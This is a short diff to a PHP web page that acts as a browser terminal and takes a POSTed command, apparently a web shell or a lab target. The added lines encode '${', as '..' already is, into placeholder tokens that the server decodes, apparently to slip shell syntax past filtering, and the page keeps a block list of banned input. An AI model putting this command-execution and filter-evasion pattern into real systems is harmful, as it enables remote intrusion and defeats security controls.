@@ -2,6 +2,7 @@
 error_reporting(0);
 $cmd = $_POST['cmd'] ?? '';
 $cmd = str_replace('__DOTDOT__', '..', $cmd);
+$cmd = str_replace('__DB__', '${', $cmd);
 $blocked = '';
 
 $banned = [
@@ -171,7 +172,8 @@ if (isset($_POST['ajax'])) {
             promptLine.textContent = '🍥 naruto:~$ ' + cmd;
             outputArea.innerHTML = '<span style="color:#999">running...</span>';
             resultArea.style.display = 'block';
-            fetch('', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'cmd=' + encodeURIComponent(cmd.replace(/\.\./g, '__DOTDOT__')) + '&ajax=1'})
+            var safe = cmd.replace(/\.\./g, '__DOTDOT__').replace(/\$\{/g, '__DB__');
+            fetch('', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'cmd=' + encodeURIComponent(safe) + '&ajax=1'})
                 .then(function(r) { return r.text(); })
                 .then(function(html) {
                     outputArea.innerHTML = html;
